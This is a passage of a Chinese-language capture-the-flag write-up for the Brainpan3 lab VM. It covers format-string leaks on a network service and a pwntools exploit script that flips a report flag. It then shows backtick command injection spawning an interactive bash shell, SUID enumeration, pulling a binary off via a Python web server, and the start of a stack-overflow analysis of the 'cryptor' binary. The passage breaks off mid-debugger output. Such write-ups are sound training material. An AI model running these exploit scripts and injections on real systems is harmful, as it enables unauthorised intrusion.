<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 4</span><br><span class="line">SELECTED: 4</span><br><span class="line">reynard@brainpan3 $ $ ls</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r-- 1 reynard reynard 22 May 10 22:26 .flag</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 give</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 up</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 <span class="built_in">let</span></span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 down</span><br></pre></td></tr></table></figure>

<p>当然，可以尝试溢出此shell脚本/二进制文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reynard@brainpan3 $ $ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">*** stack smashing detected ***: ./shell terminated</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>

<p>经过更多尝试使用典型的recon命令whoami，uname -a等的探索，可以得出结论，该shell是无用的。尝试其他选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 1</span><br><span class="line">SELECTED: 1</span><br><span class="line">REPORT MODE IS DISABLED IN THIS BUILD</span><br><span class="line"></span><br><span class="line">SELECTED: 2</span><br><span class="line"></span><br><span class="line">CODE REPOSITORY IS NOW AVAILABLE</span><br></pre></td></tr></table></figure>

<p>看起来report模式当前处于禁用状态。可以尝试打开report，但是要怎么打开？</p>
<p>打开REPOSITORY，在端口8080上启用Web服务，该端口还具有/repo目录，其中包含在此步骤中使用的二进制文件：</p>
<p><img src="http://ctfhacker.com/assets/images/repo-directory.png"></p>
<p>花一些时间了解这些二进制文件是如何工作的，但最终没有任何有用的东西。这里是否存在其他漏洞。</p>
<p>尚未查看的最后一个功能是“Update Session Name”功能：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: $ fuckfuckfuckfuck</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: fuckfuckfuckfuck</span><br></pre></td></tr></table></figure>

<p>有趣的是，可以从访问代码中使用会话名称复制字符串格式漏洞吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: $ %p.%p.%p.%p.%p.</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: 0xbfcfddcc.0x104.0x252e7025.0x70252e70.0x2e70252e.</span><br></pre></td></tr></table></figure>

<p>可以。丢弃堆栈中的很大一部分，看看有什么。发送70个％x。请注意，仅在末尾添加句点，以便更轻松地拆分结果字符串。这样可以使各个格式字符串与其输出之间的关联更加容易。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: $ %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: bfcfddcc.104.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.ff0a2e78.b76d9c20.bfcfdf1c.0.b76d9000.b76d9ac0.b76da898.b752d940.b759f0b5.b76d9ac0.59.4e.59.b76d98a0.b76d9000.b76d9ac0.</span><br><span class="line">\xff \x9cm\xb7\x1cϿ</span><br></pre></td></tr></table></figure>

<p>在这里，正在研究很多重复的值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; unhex(<span class="string">&#x27;252e7825&#x27;</span>)[::-1]</span><br><span class="line"><span class="string">&#x27;%x.%&#x27;</span></span><br></pre></td></tr></table></figure>

<p>看起来那些重复的字符是格式字符串缓冲区。此格式字符串中有一个有趣的段：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python</span></span><br><span class="line">Python 2.7.17 (default, Jan 19 2020, 19:54:54) </span><br><span class="line">[GCC 9.2.1 20200110] on linux2</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">&#x27;b76d9ac0.59.4e.59.b76d98a0.b76d9000.b76d9ac0.&#x27;</span>.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">...   unhex(item)</span><br><span class="line">... </span><br><span class="line"><span class="string">&#x27;\xb7m\x9a\xc0&#x27;</span></span><br><span class="line"><span class="string">&#x27;Y&#x27;</span></span><br><span class="line"><span class="string">&#x27;N&#x27;</span></span><br><span class="line"><span class="string">&#x27;Y&#x27;</span></span><br><span class="line"><span class="string">&#x27;\xb7m\x98\xa0&#x27;</span></span><br><span class="line"><span class="string">&#x27;\xb7m\x90\x00&#x27;</span></span><br><span class="line"><span class="string">&#x27;\xb7m\x9a\xc0&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Y，N，Y看起来非常类似于命令菜单中显示的对话框的Y，N，Y。可以尝试在Y，N，Y上写一个缓冲区，使其变为Y，Y，Y吗？抓住4e在格式字符串中的哪个位置，以便知道有多少溢出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;%x.&#x27;</span> * 70</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;SESSION: &quot;</span>)</span><br><span class="line">session_name = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Report &#x27;N&#x27; at offset &#123;&#125;&quot;</span>.format(n_index))</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span> * (4*(n_index-2) + 1) )</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行上面的脚本，注意，report现在出现了[Y]！nice！。看看如何处理report。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 4506</span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 4506</span><br><span class="line">[*] Report <span class="string">&#x27;N&#x27;</span> at offset 65</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\xff �r\xb7�%\x84\xbf</span><br><span class="line">  AUTH   [Y]    REPORT [N]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br><span class="line"></span><br><span class="line">ENTER COMMAND: SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: --------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br><span class="line"></span><br><span class="line">ENTER COMMAND: $</span><br></pre></td></tr></table></figure>

<h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line">$ this is my first report!</span><br><span class="line"></span><br><span class="line">REPORT [this is my first report!@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20200209204930.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">[+] RECORDED [dxyc/yc/&#125;i/vybcd/bu`\x7fbd///]</span><br></pre></td></tr></table></figure>

<p>从文字上看，报告似乎以某种方式进行了加密，并存储在/home/anansi/REPORTS/20200209204930.rep中。用于处理报告的二进制文件位于/ repo目录中，因此进行分析可能很有用，可以在尝试进行逆向工程之前先尝试一些其他的操作。经过几次模糊的尝试以查找缓冲区溢出和命令注入之后，得到以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ `fuck`</span><br><span class="line"></span><br><span class="line">REPORT [`fuck`s my first report!@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">sh: 1: fuck: not found</span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20200209205212.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">[+] RECORDED [��������������\xff���\xaf\xaf]</span><br></pre></td></tr></table></figure>

<p>什么？！尝试通过反引号执行命令时，收到命令未找到错误消息。这是否意味着命令执行？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ `whoami`</span><br><span class="line"></span><br><span class="line">REPORT [`whoami`my first report!@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20200209205443.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">[+] RECORDED [`o`orhlx&gt;ghsru&gt;sdqnsu&gt;&gt;&gt;]</span><br></pre></td></tr></table></figure>

<p>这可能是通过stderr实现的。可以通过管道输出到stderr来接收命令输出吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ `whoami &gt;&amp;2`</span><br><span class="line"></span><br><span class="line">REPORT [`whoami &gt;&amp;2`irst report!@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">anansi</span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20200209205645.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">[+] RECORDED [&amp;=&lt;;p=*? =;ppp]</span><br></pre></td></tr></table></figure>

<p>真好！现在有趣的部分，尝试获得一个shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line">$ `/bin/bash -i &gt;&amp;2`</span><br><span class="line"></span><br><span class="line">REPORT [`/bin/bash -i &gt;&amp;2`eport!@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (2506): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">anansi@brainpan3:/$ $ whoami</span><br><span class="line">whoami</span><br><span class="line">anansi</span><br><span class="line">anansi@brainpan3:/$ $ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">anansi@brainpan3:/$ $ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line">anansi@brainpan3:/$ $</span><br></pre></td></tr></table></figure>

<p>现在有一个用户shell程序！正常情况下，修改漏洞利用脚本以自动为我获取shell程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;%x.&#x27;</span> * 70</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;SESSION: &quot;</span>)</span><br><span class="line">session_name = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Report &#x27;N&#x27; at offset &#123;&#125;&quot;</span>.format(n_index))</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span> * (4*(n_index-2) + 1) )</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">command</span> <span class="keyword">in</span> [<span class="string">&#x27;uname -a&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>, <span class="string">&#x27;id&#x27;</span>]:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;$(&#123;&#125; &gt;&amp;2)&#x27;</span>.format(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;SENDING TO REPORT MODULE&quot;</span>)</span><br><span class="line">    output = r.recvuntil(<span class="string">&#x27;[+]&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[2]</span><br><span class="line">    log.success(<span class="string">&quot;&#123;&#125; - &#123;&#125;&quot;</span>.format(<span class="built_in">command</span>, output))</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;$(/bin/bash -i &gt;&amp;2)&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行脚本能够成功的获得shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 6851</span><br><span class="line">[*] Report <span class="string">&#x27;N&#x27;</span> at offset 65</span><br><span class="line">[+] uname -a - Linux brainpan3 3.16.0-41-generic <span class="comment">#55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux</span></span><br><span class="line">[+] whoami - anansi</span><br><span class="line">[+] id - uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">REPORT [$(/bin/bash -i &gt;&amp;2)]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (2677): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">anansi@brainpan3:/$ $ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">anansi@brainpan3:/$ $ whoami</span><br><span class="line">whoami</span><br><span class="line">anansi</span><br></pre></td></tr></table></figure>

<h2 id="步骤4"><a href="#步骤4" class="headerlink" title="步骤4"></a>步骤4</h2><p>假设需要进行某种特权提升，寻找SUID二进制文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/$ $ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/sbin/uuidd</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/mtr</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/home/reynard/private/cryptor</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/ping6</span><br></pre></td></tr></table></figure>

<p>突出显示的二进制文件是/home/neynard/private/cryptor。可以执行该二进制文件吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/home/anansi$ $ cp /home/reynard/private/cryptor .</span><br><span class="line">cp /home/reynard/private/cryptor .</span><br><span class="line">anansi@brainpan3:/home/anansi$ $ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 72</span><br><span class="line">drwxr-xr-x 3 anansi anansi  4096 Feb  6 13:09 .</span><br><span class="line">drwxr-xr-x 5 root   root    4096 May 19  2015 ..</span><br><span class="line">-rw------- 1 anansi anansi   490 Feb  9 21:03 .bash_history</span><br><span class="line">-rw-r--r-- 1 anansi anansi   220 May 19  2015 .bash_logout</span><br><span class="line">-rw-r--r-- 1 anansi anansi  3637 May 19  2015 .bashrc</span><br><span class="line">-rw-r--r-- 1 anansi anansi   675 May 19  2015 .profile</span><br><span class="line">drwxrwxrwx 2 anansi anansi  4096 Feb  9 21:04 REPORTS</span><br><span class="line">-rwxrwxrwx 1 root   dev      314 Feb  6 13:09 brainpan.8.gz</span><br><span class="line">-rwxrwxrwx 1 anansi webdev  5568 Feb  9 21:08 cryptor</span><br><span class="line">-rwxrwxrwx 1 anansi anansi   591 May 21  2015 lapinblanc.txt</span><br><span class="line">-rwxrwxrwx 1 anansi webdev 12316 Feb  6 11:05 msg_admin</span><br><span class="line">-rwxrwxrwx 1 anansi webdev  1104 Feb  6 12:57 rootsploit.py</span><br><span class="line">-rwxrwxrwx 1 anansi webdev  7609 Feb  6 10:19 trixd</span><br></pre></td></tr></table></figure>

<p>将此二进制文件从Brainpan3中提取到本地计算机上。看起来只允许端口8080离开服务器。如果不激活代码存储库（命令2），那么通过Python的内置网络服务器提取文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/home/anansi$ $ python -m SimpleHTTPServer 8080</span><br><span class="line">python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure>

<p>在我们的主机上：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.56.117:8080/cryptor</span><br></pre></td></tr></table></figure>

<p>加密二进制文件的快速完整性检查：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># checksec cryptor</span></span><br><span class="line">[*] <span class="string">&#x27;/root/vulnhub/brainpan3/2/cryptor&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>没有canary，也没有NX。这意味着，假设发现缓冲区溢出，可以跳回到堆栈/堆上的shellcode并从那里执行payload，从而避免ROP或其他恶作剧。查看IDA中的二进制文件，可以看到缓冲区溢出情况。看到分配了100个字节的缓冲区。</p>
<p><img src="http://ctfhacker.com/assets/images/cryptor-buff1.png"></p>
<p>然后检查第一个参数（argv [1]）是否小于或等于116个字节。</p>
<p><img src="http://ctfhacker.com/assets/images/cryptor-buff2.png"></p>
<p>在这里，给出了将116个字节写入100字节缓冲区的情况，有可能导致溢出。有了这些知识，对其进行动态测试。打开启用了Pwndbg的gdb ./cryptor，然后将116字节的字符串与第二个垃圾字符串扔到crytor上。使用Binjitsu创建116字节的循环字符串，以帮助查明字符串溢出的位置。从静态分析中知道了应该是什么，但是拥有多个数据点总是很好。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; cyclic(116)</span><br><span class="line"><span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab&#x27;</span></span><br></pre></td></tr></table></figure>

<p>使用116字节字符串运行二进制文件。</p>
<p>遇到崩溃</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab zzzz</span><br><span class="line">Starting program: /root/vulnhub/brainpan3/2/cryptor aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab zzzz</span><br><span class="line">[+] saving to aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab.enc</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x61616162 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x0</span><br><span class="line"> EBX  0x62616164 (<span class="string">&#x27;daab&#x27;</span>)</span><br><span class="line"> ECX  0xf7fb5000 ◂— insb   byte ptr es:[edi], dx /* 0x1d6d6c */</span><br><span class="line"> EDX  0x0</span><br><span class="line"> EDI  0x636e652e (<span class="string">&#x27;.enc&#x27;</span>)</span><br><span class="line"> ESI  0xf7fb5000 ◂— insb   byte ptr es:[edi], dx /* 0x1d6d6c */</span><br><span class="line"> EBP  0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> ESP  0xffffd208 ◂— <span class="string">&#x27;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line"> EIP  0x61616162 (<span class="string">&#x27;baaa&#x27;</span>)</span><br><span class="line">─────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x61616162</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd208 ◂— <span class="string">&#x27;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">01:0004│      0xffffd20c ◂— <span class="string">&#x27;daaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">02:0008│      0xffffd210 ◂— <span class="string">&#x27;eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">03:000c│      0xffffd214 ◂— <span class="string">&#x27;faaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">04:0010│      0xffffd218 ◂— <span class="string">&#x27;gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">05:0014│      0xffffd21c ◂— <span class="string">&#x27;haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">06:0018│      0xffffd220 ◂— <span class="string">&#x27;iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">07:001c│      0xffffd224 ◂— <span class="string">&#x27;jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 61616162</span><br><span class="line">   f 1 61616163</span><br><span class="line">   f 2 61616164</span><br><span class="line">   f 3 61616165</span><br><span class="line">   f 4 61616166</span><br><span class="line">   f 